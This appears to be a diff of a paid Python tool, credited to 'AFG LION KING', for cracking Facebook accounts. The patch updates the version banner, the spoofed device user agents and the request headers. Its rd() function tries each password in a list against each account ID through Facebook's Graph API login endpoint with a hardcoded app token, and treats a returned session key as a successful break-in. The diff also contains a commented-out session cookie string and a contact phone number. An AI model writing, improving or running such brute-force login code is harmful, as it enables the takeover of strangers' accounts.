@@ -73,7 +73,7 @@ def S1():
 	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
 	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
 	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
-	e = ";[FBAN/Orca-Android;FBAV/172.0.0.9557;FBPN/com.facebook.orca;FBLC/ex_MX;FBBV/156272337;FBCR/Tri;FBMF/samsung;FBBD/samsung;FBDV/SM-N770F|NRD90M;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1336,height=1423};FB_FW/1;FBRV/156272337]"
+	e = ";[FBAN/Orca-Android;FBAV/172.0.0.9557;FBPN/com.facebook.orca;FBLC/ex_MX;FBBV/156272337;FBCR/Tri;FBMF/samsung;FBBD/samsung;FBDV/SM-N770F|SM-S918B;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1336,height=1423};FB_FW/1;FBRV/156272337]"
 	ua = s + e	
 	return ua
 
@@ -125,7 +125,7 @@ logo = """\033[1;92m
  \033[1;97m[ \033[1;92m\033[1;92m Author   \033[1;97m \033[1;92m \033[1;97m] \033[1;92m AFG LION KING
  \033[1;97m[ \033[1;92m\033[1;92m WhatsApp\033[1;97m \033[1;92m \033[1;97m] \033[1;92m +93783361438
  \033[1;97m[ \033[1;92m\033[1;92m Status   \033[1;97m \033[1;92m \033[1;97m] \033[97;1m PAID
- \033[1;97m[ \033[1;92m\033[1;92m Version\033[1;97m \033[1;92m \033[1;97m] \033[1;92m 10.1
+ \033[1;97m[ \033[1;92m\033[1;92m Version\033[1;97m \033[1;92m \033[1;97m] \033[1;92m 10.2
  \033[1;97m----------------------------------------"""
 
 def line():
@@ -492,32 +492,8 @@ def rd(ids,passlist):
 		sys.stdout.write('\r\r\033[1;32m\x1b[1;92m [ AFGLION \x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
 		for pas in passlist:                                          
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-			ua = 'Dalvik/2.1.0 (Linux; U; Android 10; CPH2249 Build/RP1A.411926.987) [FBAN/FB4A;FBAV/222.0.0.86;FBBV/743183552;FBDM/{density=1.6409880251315052,width=945,height=1534};FBLC/en_GB;FBRV/783494603;FBCR/Axiata;FBMF/SM-N770F;FBBD/SM-N770F;FBPN/com.facebook.lite;FBDV/SM-N770F Reno 3;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]			
-			headers = {
-    'authority': 'm.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=4aLRZuVyPtLywDF3JDXPjc8o; sb=4aLRZtoYBOxT2s0FcJl7pwjn; vpd=v1%3B708x375x2.8860480785369873; ps_l=1; ps_n=1; m_pixel_ratio=2.8860480785369873; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2612%3Btimestamp%3A1725535552; wd=375x708; fr=0PfK8Q9mutH1vN7xP.AWXKxZlQHyJTF3oskIkbwAuQrc8.Bm0aLh..AAA.0.0.Bm2ZVV.AWXkS3z4tEI',
-    'dpr': '2.625',
-    'referer': 'https://m.facebook.com/bookmarks/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"SM-N770F"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"k":"rev,1016235849;locale,en_GB;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100056877322310;","a":"1725535558","t":31536000,"n":"r7SDloO9","v":"2611","p":4,"r":1016235849,"o":"h2","y":"wblt"}',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-}
-
+			ua = 'Dalvik/2.1.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21) [FBAN/FB4A;FBAV/222.0.0.86;FBBV/743183552;FBDM/{density=1.6409880251315052,width=945,height=1534};FBLC/en_GB;FBRV/783494603;FBCR/Axiata;FBMF/SM-N770F;FBBD/SM-N770F;FBPN/com.facebook.lite;FBDV/SM-N770F Reno 3;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'			
+			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
